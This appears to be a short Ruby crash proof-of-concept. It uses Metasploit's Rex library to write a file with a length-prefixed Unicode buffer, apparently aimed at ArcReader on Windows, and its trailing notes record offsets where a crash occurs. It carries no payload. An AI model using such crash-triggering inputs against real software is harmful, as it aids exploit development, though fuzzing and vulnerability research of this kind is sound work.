#!/usr/bin/env ruby
# ArcReader_Windows_107_167409.exe
require 'rex'

#sizzer = ARGV[0]

boom = Rex::Text.to_unicode('A' * 10)
x = boom.size + 2

fd = File.new('lalo.txt','wb')
fd.write([x].pack('V') + boom)
fd.close
puts Rex::Text.to_hex_dump(File.read('lalo.txt'))
__END__
line 0x1810
line 0xACF0
1:9690
BC40

F740 <- crash + 1 to size
